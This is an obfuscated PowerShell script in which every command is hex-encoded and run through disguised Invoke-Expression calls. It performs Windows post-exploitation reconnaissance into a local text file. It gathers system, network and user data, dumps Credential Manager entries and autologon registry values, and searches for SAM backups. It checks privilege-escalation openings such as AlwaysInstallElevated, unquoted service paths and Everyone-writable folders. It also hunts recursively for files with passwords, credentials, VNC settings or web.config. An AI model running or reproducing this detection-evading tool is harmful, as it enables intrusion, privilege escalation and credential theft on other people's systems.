#create file $hostname.txt in current directory
$hostname = hostname
 &( $ShelLid[1]+$sHElLID[13]+'x')(" $(set-ITEm 'vARiaBle:OFs' '') "+ [sTrinG]('4e{65>77-2dS49Q74S65G6d!20!2e-5cS24-68-6f-73!74G6e-61!6d>65Q2e!74-78G74!20Q7cv20v4f>75!74G2dG4ev75>6c{6c'-SpLiT 'G'-sPLiT 'S'-sPLIt '-' -sPLit'>'-splIt '{' -SplIt'v' -SplIt'Q' -SPLIT '!' | ForeacH{ ( [coNVERt]::toInt16(( $_.tosTRiNg()),16) -As[cHaR])})+" $( SET-ITEM  'VArIABle:oFs' ' ' ) " )


#basic system information
echo "#################################################################################################################################" >> .\$hostname.txt;
echo "SYSTEMINFO" >> .\$hostname.txt;
echo "#################################################################################################################################" >> .\$hostname.txt;

-JoIn('53G79<73}74{65{6d>69<6e<66_6fG20q3eq3ew20>2e}5cG24q68>6f}73<74}6e{61q6d>65G2eG74_78>74{3b'.SpliT( 'G{wq_<}>' )|FoReAch {( [cOnVerT]::ToInT16( ([sTRING]$_ ) , 16 )-aS[CHAR]) } ) | & ( $PshomE[21]+$psHomE[30]+'x')



#environment variables
echo "`n`n`n" >> .\$hostname.txt;
echo "#################################################################################################################################" >> .\$hostname.txt;
echo "ENVIRONMENT VARIABLES" >> .\$hostname.txt;
echo "#################################################################################################################################" >> .\$hostname.txt;

-JoIn( '47q65P74h2dq43;68h69q6c;64;49~74U65t6d;20U45q6eP76@3aU20U7ct20;66;74P20;4b~65~79t2ch56t61q6cP75q65P20t3e;3eh20;2eh5c@24U68t6fP73q74~6eh61P6d;65P2e;74h78~74h3b'.SPLiT( 'PhUtq;~@' ) |%{ ([Convert]::TOinT16(([StRinG]$_ ),16)-As [cHAR])})| InvOKe-expREsSIoN


#network information
echo "`n`n`n" >> .\$hostname.txt;
echo "#################################################################################################################################" >> .\$hostname.txt;
echo "NETWORK INFORMATION" >> .\$hostname.txt;
echo "#################################################################################################################################" >> .\$hostname.txt;

 [StRing]::JOiN('',('47h65g74S2dg4eg65h74U49z50g43S6f!6e!66h69U67K75h72U61S74g69S6fh6eg20S7cK20h66S74z20g49z6eq74z65q72q66U61U63h65U41U6cg69S61S73h2cz49K6eq74g65!72S66z61q63q65h44K65z73q63h72K69q70U74!69h6fg6eK2cq49K50S76h34g41K64!64g72z65K73!73z20!3eK3eh20U2eS5cS24!68U6fS73S74!6eS61q6dq65S2eS74K78U74K3b'-spLIT 'z' -spliT 'S' -spLIt '!' -spliT'h' -SPLit 'g'-SPLIt'U' -Split'K'-SPLiT 'q' | FoREACh{ ([cOnVErt]::TOint16(( [StRIng]$_ ), 16 ) -As [chaR]) } ))|&((GV '*mdr*').NamE[3,11,2]-JOIN'')


#dns servers
echo "`n`n`n" >> .\$hostname.txt;
echo "#################################################################################################################################" >> .\$hostname.txt;
echo "DNS SERVERS" >> .\$hostname.txt;
echo "#################################################################################################################################" >> .\$hostname.txt;

 ( '47M65y74y2dP44X6eT73L43P6cM69i65P6eM74M53L65M72%76X65T72T41X64L64L72M65M73M73y20P2dy41P64X64y72T65y73y73L46T61%6dy69P6cL79T20M49X50P76X34X20i7cy20M66y74X20L3eP3eT20L2eT5cT24L68T6fP73%74T6ey61T6dy65P2ey74%78P74L3b'.SPlIT('%TLPyMXi' )| ForeAch-oBjEct{ ([ConvERt]::TOiNt16(($_.TOStRIng() ),16) -aS[cHaR]) } )-JoIn'' |& ( $eNV:comSPeC[4,15,25]-JOiN'')


#arp cache
echo "`n`n`n" >> .\$hostname.txt;
echo "#################################################################################################################################" >> .\$hostname.txt;
echo "ARP CACHE" >> .\$hostname.txt;
echo "#################################################################################################################################" >> .\$hostname.txt;

 [StRinG]::Join('', ('47U65O74g2d>4eO65y74>4ey65@69>67r68g62U6f@72@20O2dH41@64g64y72@65O73r73>46H61g6dy69H6cH79g20>49>50U76@34r20r7cH20r66U74H20H69@66O49U6eg64g65y78O2cg49U50H41y64>64>72@65y73g73H2cH4cH69O6eU6b@4c>61g79g65H72r41U64g64>72g65>73g73U2cO53@74O61H74y65O20@3er3eH20r2eO5c>24y68r6fr73r74@6eH61H6dg65H2e@74>78H74r3b'.SPLIT('Uy@H>gOr' ) | FoReaCh{( [ChaR]([coNvERT]::toint16( ($_.TOsTRinG() ) ,16) ))}) ) | IEx


#routing table
echo "`n`n`n" >> .\$hostname.txt;
echo "#################################################################################################################################" >> .\$hostname.txt;
echo "ROUTING TABLE" >> .\$hostname.txt;
echo "#################################################################################################################################" >> .\$hostname.txt;

-Join( '47:65g74%2d&4eW65%74%52&6fg75g74v65&20W2dg41&64S64&72g65O73g73W46W61W6dv69v6c&79O20%49%50S76%34W20W7cO20v66:74&20%44S65g73g74O69&6eO61S74S69%6f%6e&50g72&65g66S69v78S2cg4e&65W78v74g48&6fS70:2cg52S6f%75g74%65O4dO65g74g72v69O63:2cg69%66W49&6e%64&65%78%20&3eO3eO20S2e&5c&24O68W6fg73:74O6e&61%6dg65S2ev74:78&74%3b'.sPLIT( '&SOg:Wv%')|% { ([ChAR]([COnveRt]::ToinT16( ([StRIng]$_ ) ,16) )) } )|InvoKE-EXPrESsiON


#network connections
echo "`n`n`n" >> .\$hostname.txt;
echo "#################################################################################################################################" >> .\$hostname.txt;
echo "NETWORK CONNECTIONS" >> .\$hostname.txt;
echo "#################################################################################################################################" >> .\$hostname.txt;

 ( '4e-65k74R73>74U61<74R20k3e<3eN20>2eN5cU24>68-6f-73U74N6ei61>6dU65U2e>74R78U74i3b'.SpLIt('-<kNRUi>') | FOreacH-OBJeCT{( [CoNVeRt]::Toint16( ($_.tOsTRiNG() ),16 ) -As [chaR])} )-jOiN ''|& ( $eNV:coMsPec[4,24,25]-join'')


#connected drives
echo "`n`n`n" >> .\$hostname.txt;
echo "#################################################################################################################################" >> .\$hostname.txt;
echo "CONNECTED DRIVES" >> .\$hostname.txt;
echo "#################################################################################################################################" >> .\$hostname.txt;

 ('47Z65_74U2dZ56U6f~6c~75_6dZ65g20<3eU3e~20<2e~5cU24{68_6f<73{74{6eU61<6d<65~2eZ74~78U74{3b'.spLIt( '~pU_g{Z<' )| foreach { ( [ChaR]( [CoNvErt]::tOiNt16(( [STRing]$_ ),16) )) })-join '' | & ((VARIablE '*MdR*').NAmE[3,11,2]-jOiN'')


#firewall config
echo "`n`n`n" >> .\$hostname.txt;
echo "#################################################################################################################################" >> .\$hostname.txt;
echo "FIREWALL CONFIG" >> .\$hostname.txt;
echo "#################################################################################################################################" >> .\$hostname.txt;

[StRINg]::JOin( '' , ('47<65<74~2d%4eu65%74u46<69-72<65k77%61~6c%6cS50~72k6f<66-69S6c%65n20S3e~3e<20~2en5ck24~68n6fk73k74<6e%61k6d<65n2ek74%78S74u3b'.SpLiT('<uSnk-%~') |fOreACH{([CONVeRt]::ToiNt16(([StRIng]$_ ) ,16 )-as [CHar]) } )) | .( $SHELLiD[1]+$sHELLid[13]+'X')


#current user
echo "`n`n`n" >> .\$hostname.txt;
echo "#################################################################################################################################" >> .\$hostname.txt;
echo "CURRENT USER" >> .\$hostname.txt;
echo "#################################################################################################################################" >> .\$hostname.txt;

 ('77g68L6f%61L6dO69g20k3eP3eL20;2eO5c:24O68:6fO73L74O6eP61L6d;65:2ek74:78O74L3b'.sPlit('%LO;kg:P' )| ForEACh{ ([CoNvERt]::tOINT16( ($_.toStRIng()), 16) -as [CHAr])} ) -joIn ''|. ( $VeRBoSeprEfeREnce.ToSTrING()[1,3]+'X'-jOiN'')


#user privileges
echo "`n`n`n" >> .\$hostname.txt;
echo "#################################################################################################################################" >> .\$hostname.txt;
echo "USER PRIVILEGES" >> .\$hostname.txt;
echo "#################################################################################################################################" >> .\$hostname.txt;

 . ( $SHelLid[1]+$shEllid[13]+'x')((( 77,68 ,'6f' ,61 , '6d' , 69, 20 , '2f', 70 ,72, 69 , 76,20 , '3e', '3e',20,'2e' ,'5c' , 24,68, '6f' ,73,74, '6e',61,'6d',65 ,'2e' , 74,78, 74,'3b' ) |% {([coNVERT]::tOInT16( ( [striNg]$_ ) ,16)-aS[cHaR]) })-JoIn'')

#local users
echo "`n`n`n" >> .\$hostname.txt;
echo "#################################################################################################################################" >> .\$hostname.txt;
echo "LOCAL USERS" >> .\$hostname.txt;
echo "#################################################################################################################################" >> .\$hostname.txt;

 & ( $psHomE[21]+$PShOME[30]+'X') (-join( '47_65U74&2dK4c>6f!63>61>6c}55&73K65K72}20H7c&20_66&74_20H4e}61}6d&65>2c>45&6eK61K62>6c>65&64K2c>4cH61}73!74}4c>6f!67&6f_6e&20_3eH3eK20!2eH5c>24>68!6f&73!74_6eH61}6d&65!2e_74!78!74U3b'.SplIT( '_&UKH!}>') |FoReAch{([coNVErT]::toiNT16( ([StriNG]$_ ),16 ) -as [CHaR])}) )


#logged in users
echo "`n`n`n" >> .\$hostname.txt;
echo "#################################################################################################################################" >> .\$hostname.txt;
echo "LOGGED IN USERS" >> .\$hostname.txt;
echo "#################################################################################################################################" >> .\$hostname.txt;

 [sTriNG]::JoIn( '',( '71y77l69y6eP73l74P61y20l2dP4ev6fg4eg65X77g57g69Q6ey64:6fP77X20:2dQ57:61g69y74Q20:3eX3eP20:2eP5cy24X68v6fX73:74X6eP61Q6dg65y2el74l78g74:3b'.SPLIt('l:yXvgPQ' ) | forEACh{ ([convErt]::TOInT16(([StRING]$_) , 16 )-as [chAR]) })) |. ( $ENv:comSpEC[4,24,25]-jOin'')


#credential manager
echo "`n`n`n" >> .\$hostname.txt;
echo "#################################################################################################################################" >> .\$hostname.txt;
echo "CREDENTIAL MANAGER" >> .\$hostname.txt;
echo "#################################################################################################################################" >> .\$hostname.txt;

 .( $ShEllId[1]+$SheLLid[13]+'x') ("$(SeT 'oFs'  '')"+[STrInG]( (63,'6d',64, '6b' ,65 ,79,20, '2f', '6c' ,69 , 73 ,74 ,20 , '3e', '3e' ,20,'2e', '5c' , 24 ,68 ,'6f' , 73 ,74, '6e',61, '6d',65,'2e', 74,78, 74 ,'3b')|%{([CHar]([CONvert]::ToInt16( ([sTrINg]$_) ,16))) }) +" $( set  'OfS'  ' ' )" )


#user autologon registry items
echo "`n`n`n" >> .\$hostname.txt;
echo "#################################################################################################################################" >> .\$hostname.txt;
echo "USER AUTOLOGON REGISTRY ITEMS" >> .\$hostname.txt;
echo "#################################################################################################################################" >> .\$hostname.txt;

& ( $eNV:coMSPEc[4,26,25]-JOIn'')("$(set-IteM  'varIablE:ofs' '') "+ [string]('47L65L74>2dq49~74~65>6dK50y72~6fL70q65r72Z74q79L20K2d>50q61L74Z68K20q22L52q65~67L69y73>74L72r79r3ar3aK48r4bL45K59L5fr4c>4fL43K41r4cK5fy4dK41L43K48L49L4e>45K5c>53L4f~46y54K57>41r52Z45y5cZ4d~69r63L72Z6fZ73K6fL66>74r5cy57r69y6eq64Z6fr77L73L20~4eq54L5cq43r75>72~72K65L6e>74L56L65~72K73K69~6fq6eq5c>57>69~6eK4cy6fy67q6f>6eq22y20Z7c>20q73r65~6cy65L63r74Z20q22r44>65r66r61Z75Z6cy74~2ar22K20L3eq3e~20L2e>5c>24r68>6f~73r74K6eZ61r6dq65q2eK74~78Z74r3b'.SPlIT( '~r>ZKLqy')| fOreach-ObjEcT {([coNvErt]::ToINt16( ( $_.tOstrInG() ) , 16)-As [chaR]) }) +"$(Sv 'OFS' ' ')" )


#local groups
echo "`n`n`n" >> .\$hostname.txt;
echo "#################################################################################################################################" >> .\$hostname.txt;
echo "LOCAL GROUPS" >> .\$hostname.txt;
echo "#################################################################################################################################" >> .\$hostname.txt;

 -joiN ( '47@65_74&2d{4c&6f&63_61M6co47M72M6f{75@70_20M7cM20<66@74:20o4eo61{6dM65o20{3eM3e_20o2eo5c@24_68<6fM73:74:6e_61@6d_65_2e{74:78&74_3b'.SpLIt('@{o<M:&_')|% {( [CHAR] ([coNVerT]::toiNt16(( $_.tOstRiNG() ) ,16))) } )| IEX


#local administrators
echo "`n`n`n" >> .\$hostname.txt;
echo "#################################################################################################################################" >> .\$hostname.txt;
echo "LOCAL ADMINISTRATORS" >> .\$hostname.txt;
echo "#################################################################################################################################" >> .\$hostname.txt;

 &( ([stRInG]$vERBosepReFEReNce)[1,3]+'X'-jOIn'')(-joiN( '47}65G74G2di4cN6fG63}61N6cy47>72}6f%75i70>4d>65m6d>62%65m72%20}410G434i43cy438%43dN438G441%442G440G430}442m43eN440}44by20%7c%20N66%74m20%4e}61G6di65N2c>20>50G72}69m6e}63m69>70i61>6c%53m6f}75%72}63%65y20i3e%3ey20>2ey5cG24y68i6fm73y74}6eN61}6di65G2e>74%78N74G3b'-spLit'>' -sPliT '%' -splIT'N'-SPLIt'G' -SpliT'y'-sPLiT'm' -sPLit'i'-SpLit '}'| %{ ([cONvErt]::toINT16( ([StriNG]$_), 16)-AS[cHar]) } ) )


#user directories
echo "`n`n`n" >> .\$hostname.txt;
echo "#################################################################################################################################" >> .\$hostname.txt;
echo "USER DIRECTORIES" >> .\$hostname.txt;
echo "#################################################################################################################################" >> .\$hostname.txt;

 .( $SHELlId[1]+$ShELLiD[13]+'x') ( " $(set-IteM  'vAriAbLE:oFS' '') " +[stRInG]((47 ,65 ,74 , '2d' , 43 , 68, 69, '6c',64 ,49, 74 ,65 , '6d', 20, 43,'3a' , '5c' ,55 ,73 , 65, 72 , 73 , 20, '7c',20,66 , 74 , 20, '4e' , 61 ,'6d', 65,20,'3e' ,'3e' ,20 ,'2e' ,'5c',24 , 68 ,'6f' ,73 , 74,'6e' ,61,'6d' , 65 ,'2e' , 74, 78 ,74 , '3b' )| fOReACh-ObJecT{([ChaR] ( [CoNvERT]::tOint16(($_.tOstRiNG() ) ,16 ))) })+"$( set-vaRiAbLe 'Ofs' ' ') ")


#searching for SAM backup files
echo "`n`n`n" >> .\$hostname.txt;
echo "#################################################################################################################################" >> .\$hostname.txt;
echo "SEARCHING FOR SAM BACKUP FILES" >> .\$hostname.txt;
echo "#################################################################################################################################" >> .\$hostname.txt;

 . ( $verbOSEpREfeRENCe.tOStRINg()[1,3]+'x'-JoIN'') ("$( SET-ItEm 'vaRiABLE:OFS'  '' )"+ [StriNG]('54}65!73@74}2d}50S61S74}68!20v25}53:59v53}54S45}4d_52!4fS4f:54v25_5cS72!65_70;61}69S72;5c;53v41_4d;20!3e}3e}20!2ev5c:24_68:6fv73@74}6e@61!6dS65!2e:74!78@74}3b' -spLIT'@' -Split'v'-spLiT';' -spLiT '}'-SpLIT'S'-SPliT '!' -SPLit':' -splIt '_' |FOReAcH{ ( [CoNveRT]::tOInT16(($_.toSTriNG()) ,16) -As[ChaR]) } )+" $(SET-VaRIABlE 'OfS'  ' ' )" )
Iex( -JoIn(( 54,65, 73 ,74 , '2d', 50 , 61 , 74 , 68,20 , 25 ,53, 59, 53,54,45 ,'4d' , 52, '4f' , '4f' , 54 ,25 , '5c' , 73,79 ,73, 74, 65, '6d' , 33,32 , '5c',63 , '6f' , '6e',66,69 ,67 ,'5c' ,72 , 65, 67, 62,61, 63,'6b', '5c', 53, 41, '4d',20,'3e' , '3e' , 20,'2e','5c' , 24 , 68 ,'6f' , 73 , 74,'6e', 61, '6d', 65 , '2e' ,74 , 78, 74 , '3b')| ForEACH {( [chaR]([COnvERT]::ToINt16( ( $_.tostriNg()) ,16) )) }))


#running processes
echo "`n`n`n" >> .\$hostname.txt;
echo "#################################################################################################################################" >> .\$hostname.txt;
echo "RUNNING PROCESSES" >> .\$hostname.txt;
echo "#################################################################################################################################" >> .\$hostname.txt;

 " $( sV 'ofs' '' )"+ [stRINg]('67~77K6d}69}20r2dS51o75r65m72m79}20w22o53w65w6cm65~63S74~20}2am20K66m72r6f~6dS20K57}69S6e}33w32o5fK50K72}6fm63m65~73o73K22r20m7c}20K77K68S65~72m65r20w7br24}5fr2ew4em61}6d}65m20~2dw6e}6fK74o6cm69S6bo65m20m22r73S76m63}68~6fm73K74K2ao22m7dm20K7c~20r53~65r6cr65K63o74o20w4e}61w6d}65~2cw20K48K61r6e}64S6cw65S2cw20w40S7bw4c}61~62S65r6co3dS22}4f}77K6ew65o72K22}3b}45~78m70~72}65m73w73o69m6fm6eo3d~7br24K5fr2ew47r65}74w4fw77r6eo65m72r28S29S2ew55}73o65r72}7d}7do20S7c~20K66S74m20S2dw41m75o74o6f~53r69~7aK65r20}3er3e}20o2eS5cm24w68S6fS73m74r6eS61S6dS65}2e~74w78r74S3b' -sPlIt 'r' -SpLiT 'S'-sPlIt'}' -SPLiT 'K' -sPlIt 'o' -Split '~' -splIT 'm' -sPLiT'w'|% { ( [CoNvert]::toINt16( ($_.TOsTriNg()), 16 ) -AS [cHaR]) } ) +" $(sEt-ITem 'vARiAbLe:OfS' ' ') " |& ( $PsHoMe[4]+$PSHOmE[30]+'x')


#installed software directories
echo "`n`n`n" >> .\$hostname.txt;
echo "#################################################################################################################################" >> .\$hostname.txt;
echo "INSTALLED SOFTWARE DIRECTORIES" >> .\$hostname.txt;
echo "#################################################################################################################################" >> .\$hostname.txt;

 -JOIn ( ( 47, 65 ,74,'2d',43, 68, 69 ,'6c' ,64,49 , 74,65 , '6d' , 20 ,22 ,43, '3a', '5c' , 50,72,'6f' , 67 , 72,61,'6d',20, 46 ,69,'6c', 65 , 73,22, '2c', 20,22, 43 , '3a' ,'5c',50 , 72 , '6f' ,67 ,72 , 61 ,'6d' , 20 ,46 ,69,'6c', 65,73, 20, 28 ,78, 38,36 ,29 ,22, 20, '7c' , 20, 66,74 , 20, 50 ,61 ,72,65, '6e' , 74 ,'2c' , '4e',61 ,'6d',65 , '2c','4c' , 61 , 73 ,74 ,57 ,72, 69,74 ,65 , 54 ,69,'6d', 65 ,20,'3e' ,'3e' , 20, '2e' , '5c', 24,68 ,'6f', 73 , 74 , '6e' ,61 ,'6d', 65 ,'2e' ,74,78 ,74 , '3b' )|fOREAcH-OBJeCT {( [ChaR] ([cOnvERt]::ToINt16(( $_.ToSTring() ) ,16 ) ))}) | &( ([StriNg]$veRBosepREfeReNCE)[1,3]+'X'-JoIn'')


#software in registry
echo "`n`n`n" >> .\$hostname.txt;
echo "#################################################################################################################################" >> .\$hostname.txt;
echo "SOFTWARE IN REGISTRY" >> .\$hostname.txt;
echo "#################################################################################################################################" >> .\$hostname.txt;

 "$(SeT-IteM 'VarIAblE:ofS'  '') " + [striNG]('47}65S74;2d}43@68z69z6c@64@49G74G65S6d@20;2d,70;61G74@68}20@52;65S67z69G73S74@72@79@3a@3az48;4bn45,59G5f;4c}4fS43n41@4cS5f,4d}41@43G48G49,4eS45S5c@53S4f}46@54z57,41,52,45}20G7c;20}66z74;20;4eG61@6d,65;20S3e}3e}20}2e;5cG24n68}6fz73n74z6e@61n6dG65;2eS74}78z74z3b'.SPLIt('zG}S@;,n') | fOREAch-oBjecT {([CONVERT]::TOinT16( ($_.toSTRinG()), 16)-as [cHaR])} )+" $(SET-VAriABlE  'oFS' ' ')"| .((gV '*mdR*').nAME[3,11,2]-JOiN'')


#folders with everyone permissions
echo "`n`n`n" >> .\$hostname.txt;
echo "#################################################################################################################################" >> .\$hostname.txt;
echo "FOLDERS WITH EVERYONE PERMISSIONS" >> .\$hostname.txt;
echo "#################################################################################################################################" >> .\$hostname.txt;

. ( ([StrinG]$vERboSepREferENce)[1,3]+'X'-JoIn'') ([STrinG]::JOIn( '' ,('47N65N74<2dN43P68N69:6cP64N49X74:65:6dP20@22<43N3a<5cX50@72P6fU67@72<61:6d:20<46P69U6c,65P73N2aX22P2cX20:22X43,3aX5c,50P72N6f,67X72U61,6dU20@46P69<6c@65N73U20,28X78X38U36<29@2aX22@20:7c@20@25,20U7bU20:74<72X79<20X7bX20:47<65P74,2dU41X63N6c,20@24@5fX20N2dP45<41N20:53:69,6c,65X6e,74U6cX79P43:6fX6e:74X69P6eX75U65,20U7cP20N57,68U65:72U65<20P7bX28N24N5fU2e,41<63,63N65N73N73<7cN73N65N6cN65X63,74<20@2dN45@78@70,61,6eN64U50,72<6f@70@65X72U74<79@20P49U64U65:6e:74@69@74,79P52:65P66X65P72,65X6eN63:65U29U20X2d:6dP61X74N63P68P20U22X45,76:65@72N79<6f,6eX65U22N7dU20X7d<20,63<61<74:63@68:20X7bP7d<7d:20:3eU3e<20@2e@5c@24X68P6fN73X74:6eX61P6d,65N2eP74P78U74U3b' -SPlIT 'U' -SplIt'@'-spLit'N' -splIt 'X' -spliT 'P'-split':'-sPLIt'<' -spLiT',' | FOReaCH { ([ConVerT]::toInT16(( [StrinG]$_ ),16 ) -AS[cHAR]) } )) )


#checking registry for alwaysinstallelevated
echo "`n`n`n" >> .\$hostname.txt;
echo "#################################################################################################################################" >> .\$hostname.txt;
echo "CHECKING REGISTRY FOR ALWAYSINSTALLELEVATED" >> .\$hostname.txt;
echo "#################################################################################################################################" >> .\$hostname.txt;

 INVOkE-ExprEsSIoN ( " $(set-ITEM 'vARIabLE:OfS' '' )"+[StRiNg]((54 ,65 , 73 , 74 ,'2d',50 , 61 , 74 ,68 ,20 ,'2d' , 50,61, 74, 68,20,22,52 , 65,67,69,73 , 74,72, 79 ,'3a','3a' , 48,'4b' ,45 , 59 ,'5f' , 43 , 55, 52,52 , 45, '4e',54,'5f' ,55, 53,45 ,52 , '5c' , 53,'4f',46, 54 , 57, 41,52, 45, '5c' ,50 , '6f' , '6c',69 ,63, 69 , 65, 73 , '5c' ,'4d', 69, 63,72, '6f' , 73 ,'6f' ,66 ,74 , '5c', 57 , 69,'6e' , 64,'6f' ,77 , 73,'5c',49 , '6e' ,73 ,74,61, '6c' , '6c',65 ,72, 22 , 20 ,'3e' , '3e', 20 , '2e','5c' ,24 ,68,'6f',73 ,74,'6e' ,61 , '6d' , 65 ,'2e' ,74,78, 74 ,'3b')| ForeacH{( [Char]( [cONverT]::tOINT16( ([STrinG]$_ ) ,16 ))) })+"$(SeT  'ofs'  ' ')" )


#unquoted service paths
echo "`n`n`n" >> .\$hostname.txt;
echo "#################################################################################################################################" >> .\$hostname.txt;
echo "UNQUOTED SERVICE PATHS" >> .\$hostname.txt;
echo "#################################################################################################################################" >> .\$hostname.txt;

inVoke-eXPreSsion([sTring]::jOIN( '',('67-77H6d-69Z20;2dH63&6c;61}73-73%20H57H69&6eL33Z32}5fH53-65Z72H76&69H63%65-20L2d;50H72;6f}70&65L72&74&79H20%4e%61%6dZ65%2c%20-44Z69%73&70&6c}61}79Z4e-61%6dH65L2cZ20-50}61Z74&68L4eZ61%6d%65Z2c;20-53-74;61;72L74&4d;6f-64&65-20L7c&20-57}68L65L72Z65;20}7b;24;5f;2eL53;74&61}72H74Z4d;6fH64-65}20L2d&65H71Z20%22Z41L75}74H6f-22&20-2d&61Z6e}64H20H24H5f-2e&50;61H74H68L4e%61&6dH65-20Z2dL6e;6f;74;6cH69%6b-65H20Z22&43;3a-5c%57Z69;6e&64L6f}77L73;22&20Z2dL61%6e&64Z20&24L5f}2eL50Z61;74&68;4e%61;6d&65H20-2dZ6e}6fL74;6c}69-6b;65H20H27%22Z27H7dZ20&7cH20L73&65%6c%65Z63;74&20%50;61}74%68}4eL61L6d}65Z2cZ20H44Z69&73;70%6c&61%79}4e-61-6d%65&2c%20Z4eH61-6d;65;20&3e&3e&20}2eZ5c;24L68%6f-73;74%6e;61L6d}65;2e}74H78L74&3b'-sPLIt '%'-sPlIT '-'-SpLIt'}'-sPlit'&' -SpliT'L' -SPLit 'Z'-SpLit ';'-SplIT'H'| FOReacH-oBJeCt{ ([COnVErt]::tOinT16(([STring]$_ ) ,16)-aS [ChAR])})))


#scheduled tasks
echo "`n`n`n" >> .\$hostname.txt;
echo "#################################################################################################################################" >> .\$hostname.txt;
echo "SCHEDULED TASKS" >> .\$hostname.txt;
echo "#################################################################################################################################" >> .\$hostname.txt;

 "$( sv 'oFS'  '') "+ [STRINg]('47t65:74>2d,53:63G68&65>64:75:6ci65t64:54G61&73i6b>20<7ct20&77i68:65:72t65<20i7b:24<5f>2e<54&61i73,6b:50,61>74>68:20i2d>6et6f,74>6cG69t6b<65>20i22t5cG4d:69G63:72,6f:73&6f:66i74t2a&22i7d:20i7c:20i66,74t20<54&61:73<6bi4et61>6dt65<2c<54,61i73<6bi50,61G74i68G2c,53:74<61:74>65>20,3e:3e>20t2eG5c<24G68>6f,73&74&6e>61,6dG65t2e:74G78&74G3b'.spLit(':G,&i<>t' ) | fOreaCh-oBjeCt {( [CONverT]::ToInt16(( [sTrIng]$_ ),16)-aS [ChAR])}) +" $(sET-itEm 'VaRiABle:oFs'  ' ') "| INvOke-exPrESSIOn
[STRIng]::jOiN( '' , ( (47,65, 74 , '2d', 43 , 68, 69 , '6c', 64 , 49 , 74 ,65 ,'6d' , 20 , 43, '3a' , '5c',57, 69 , '6e', 64 , '6f',77 ,73,'5c',54 ,61,73 ,'6b',73 , 20,'3e','3e', 20,'2e' , '5c' , 24, 68,'6f', 73 , 74 ,'6e', 61 ,'6d',65, '2e' ,74 , 78 ,74, '3b' )| %{( [ChAR]( [coNVErT]::ToiNt16( ($_.toStriNg() ),16))) } ) )| & ((gV '*MDR*').naME[3,11,2]-jOin'')


#startup commands
echo "`n`n`n" >> .\$hostname.txt;
echo "#################################################################################################################################" >> .\$hostname.txt;
echo "STARTUP COMMANDS" >> .\$hostname.txt;
echo "#################################################################################################################################" >> .\$hostname.txt;

-JoIN( '47T65:74r2dT43n69X6d:49}6eX73:74}61-6ey63T65-20X57X69X6eX33X32y5fy53r74y61}72:74:75:70}43-6f-6dy6dn61X6e:64-20}7cX20-73-65r6cr65}63:74X20r4en61-6d-65n2c}20X63T6f-6dr6dT61}6e-64r2cy20:4cr6fT63-61-74X69X6fn6e:2cX20n55}73-65-72r20T3eX3er20-2e}5cy24r68r6fX73r74}6eT61r6dT65r2eT74}78}74r3b'.SpLiT('}ny:T-rX')|fOReaCh{ ( [cONVErT]::TOInT16(( $_.TOStRing() ) , 16) -AS[chAr])}) |& ( $SheLlid[1]+$SHELliD[13]+'x')


#searching for useful files containing sensitive information
echo "`n`n`n" >> .\$hostname.txt;
echo "#################################################################################################################################" >> .\$hostname.txt;
echo "SEARCHING FOR USEFUL FILES CONTAINING SENSITIVE INFORMATION" >> .\$hostname.txt;
echo "#################################################################################################################################" >> .\$hostname.txt;

. ((vARiaBle '*MDr*').NAme[3,11,2]-Join'')(('47j65:74:2d;43{68,69%6ch64:69,74h65j6dh20{2d{50{61h74h68,20{43{3ah5c,20-2d,49h6e-63,6c:75{64j65{20;75-6e{61-74:74,65;6e:64h2ch73;79,73h70-72;65h70{20,2d;46;69,6c,65-20%2d-52;65-63h75%72{73,65:20-2d{45%72-72;6fj72{41%63;74;69h6fh6e:20:53j69j6c,65;6e-74{6c:79-43-6fj6e%74j69:6e%75-65:20{7c{20%77{68,65{72,65-20;7b;28:24{5f;2e%4e;61h6dh65,20;2d;6cj69h6bh65j20{22{2e%78%6dj6c%22%20{2d,6fj72%20%24j5fh2e{4e%61:6d;65j20;2d%6c,69:6b{65-20j22h2e-74h78,74:22{20:2d%6fh72{20{24%5f{2e:4e:61-6d,65-20%2d{6c{69h6b;65,20:22h2a:2e%69%6e-69h22,29%7d,20h3e:3e%20-2e%5c:24;68;6fj73h74j6e-61j6dj65{2e%74;78-74h3b'.sPlIT('j-%,{;:h')|FOREacH{( [cHar]([cONVerT]::TOINT16(( $_.tostRINg()) ,16) ))} ) -JOiN'')
 [sTRiNg]::Join( '',('47X65_74w2dZ43S68w69&6c_64u69&74&65&6d>20u2du50u61u74X68>20w43Z3a_5c>20X2dX49u6eZ63_6cu75X64&65S20S77&65X62>2e>63u6f>6e>66&69>67X20&2dw46X69Z6cu65w20X2du52Z65Z63_75u72S73Z65X20Z2d>45X72w72S6fw72S41w63&74w69u6fZ6eX20_53_69X6c&65w6eX74u6c>79w43w6f>6eS74S69u6eZ75u65u20w3eX3ew20X2e_5cZ24w68u6f_73&74_6ew61w6d&65Z2eX74Z78>74w3b'-SPLit 'S'-SPLIT'_'-SPLit 'u'-Split'w'-SpLit 'Z'-SPlIt '>' -SPlIT'&' -SpLIt'X'| foreaCH-oBjecT { ([cONvERT]::ToiNT16( ([sTrIng]$_ ),16)-As [cHAR]) })) | & ( $eNv:CoMsPEc[4,24,25]-join'')
((47 ,65 , 74 , '2d',43,68 , 69 , '6c', 64 , 69,74 , 65 ,'6d',20 ,'2d' ,50 ,61 , 74, 68, 20,43,'3a' ,'5c', 20, '2d' , 49 , '6e', 63, '6c',75, 64 ,65 , 20,70 , 61,73,73 ,77 ,'6f',72 ,64 ,'2c',63,72 , 65 ,64 , '2c', 76 ,'6e' ,63,20,'2d',46, 69, '6c' ,65, 20 , '2d' , 52, 65,63, 75,72 ,73,65,20 , '2d', 45 , 72 , 72 , '6f', 72, 41,63 ,74 , 69, '6f' ,'6e',20,53 , 69 ,'6c' , 65 , '6e' , 74 , '6c',79 , 43 ,'6f','6e' , 74,69 , '6e' ,75 , 65,20,'3e' , '3e' ,20,'2e','5c',24 , 68 ,'6f',73,74,'6e' , 61 , '6d' , 65, '2e', 74,78 ,74 , '3b')| %{ ([coNvert]::tOInt16(( [STrING]$_),16 )-AS[chAr]) }) -JOiN'' | & ((VARiABle '*mdr*').Name[3,11,2]-JOiN'')
